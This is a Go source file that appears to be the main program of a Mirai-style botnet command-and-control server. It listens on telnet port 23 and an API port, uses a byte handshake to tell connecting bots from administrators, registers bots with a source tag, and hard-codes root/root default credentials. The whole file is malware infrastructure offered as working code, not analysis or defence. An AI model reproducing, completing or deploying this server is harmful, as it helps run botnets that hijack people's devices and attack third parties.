package main

import (
	"errors"
	"fmt"
	"net"
	"time"
)

const DefaultUser string = "root"
const DefaultPass string = "root"

var clientList *ClientList = NewClientList()

func main() {
	fmt.Println("[CNC] Start")
	tel, err := net.Listen("tcp", "0.0.0.0:23")
	if err != nil {
		fmt.Println(err)
		return
	}

	api, err := net.Listen("tcp", "0.0.0.0:101")
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[+] Port listening completed")

	go func() {
		for {
			conn, err := api.Accept()
			if err != nil {
				break
			}
			go apiHandler(conn)
		}
	}()

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}

	fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	fmt.Printf("[DEBUG] err: %d, l: %d, buf[0]: %x, buf[1]: %x, buf[2]: %x\n", err, l, buf[0], buf[1], buf[2])
	fmt.Printf("[DEBUG] Full buffer: %x\n", buf[:l])

	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			fmt.Println("[+] New Bot with source connected")
			NewBot(conn, buf[3], source).Handle()
		} else {
			fmt.Println("[!] New bot no source connected")
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		fmt.Println("[+] New Admin Connected")
		NewAdmin(conn).Handle()
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()

	NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
